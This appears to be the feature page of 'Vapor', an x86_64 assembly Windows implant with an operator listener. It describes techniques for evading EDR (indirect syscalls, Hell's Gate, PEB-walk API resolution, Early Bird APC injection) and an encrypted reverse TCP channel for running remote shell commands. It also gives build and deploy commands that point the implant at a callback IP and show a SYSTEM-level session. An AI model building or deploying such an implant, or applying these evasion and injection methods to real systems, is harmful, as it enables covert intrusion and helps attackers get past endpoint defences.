Technical Features

Every component built from scratch in x86_64 NASM assembly. No compiler, no runtime, no abstractions.

ChaCha20-Poly1305

Full RFC 8439 AEAD in pure assembly. 256-bit PSK, 12-byte random nonce per message, Poly1305 MAC with mod 2^130-5 arithmetic.

PEB Walk

All Windows APIs resolved via gs:[0x60] PEB walking and ror13 hash matching. Zero imports, zero API name strings.

Hell's Gate

Syscall numbers extracted from ntdll stub opcodes at runtime. Halo's Gate fallback scans neighbor stubs when hooks are detected.

Indirect Syscalls

All NT syscalls jump to a syscall; ret gadget found in ntdll's .text section. Return address traces back to ntdll, not the injector.

Early Bird APC

Target created suspended. Shellcode written via NT syscalls (RW to RX). APC queued to main thread — fires before EDR userland hooks.

Position-Independent

Entire implant is PIC shellcode. No relocations, no fixed addresses. Inject into any process at any base address.

Dual Output

Same source builds as raw shellcode (vapor.bin) for injection and minimal PE (vapor.exe) for direct execution.

Piped Execution

CreateProcessA with cmd.exe /c, anonymous pipe capture of stdout+stderr, PeekNamedPipe polling with 30s timeout.

Build Script

One command generates a random 256-bit PSK, assembles implant + injector, and prints the exact listener command to run.

Detection Awareness

Know what Vapor evades and what it doesn't. Honest tooling for professional operators.

Evades

  • User-mode API hooking — indirect syscalls bypass hooks
  • Import table analysis — zero imports, PEB-resolved
  • Static signature scanning — no API strings in binary
  • Early EDR initialization — APC fires before entry point
  • Network content inspection — ChaCha20-Poly1305 AEAD

Visible To

  • ETW / kernel callbacks — syscall tracing
  • Network metadata — raw TCP connection visible
  • Kernel-mode EDR — behavioral analysis
  • Memory forensics — shellcode in process memory
  • AMSI — script-based detection (if applicable)

Architecture

Four-layer design. API resolution feeds crypto and networking. Injector operates via direct NT syscalls.

1

API Resolution

PEB walk via gs:[0x60] to InMemoryOrderModuleList. Export table traversal with ror13 hash matching. GetProcAddress for forwarded exports.

2

Crypto Engine

ChaCha20 quarter-round in registers, 20 rounds per block. Poly1305 MAC with full mod 2^130-5 arithmetic. AEAD per RFC 8439 Section 2.8.

3

Transport

Raw TCP via WSASocketA / connect. Wire format: [len(4)][nonce(12)][ciphertext][mac(16)]. Random nonces via RtlGenRandom.

4

Injection Engine

Hell's Gate SSN extraction from ntdll stubs. Indirect syscall gadget discovery. NtAllocateVirtualMemory → NtWriteVirtualMemory → NtProtectVirtualMemory → NtQueueApcThread → NtResumeThread.

Getting Started

Build from source with NASM and MinGW-w64. One command generates everything.

build.sh 
# Clone and build
$ git clone https://github.com/Real-Fruit-Snacks/Vapor.git
$ cd Vapor

# Build with auto-generated PSK
$ ./build.sh 10.10.14.1 443
[*] Generated PSK: a1b2c3d4...
[*] Assembled vapor.bin (3,612 bytes)
[*] Linked vapor.exe
[*] Built injector.exe

# Or with your own key
$ ./build.sh 10.10.14.1 443 <64-hex-chars>
deploy.sh 
# Start listener (operator machine)
$ python3 listener.py --lport 443 --key <psk>
[*] Listening on 0.0.0.0:443
[+] Connection from 10.10.10.5:49152

# Execute commands
vapor> whoami
nt authority\system

vapor> ipconfig
IPv4 Address: 10.10.10.5
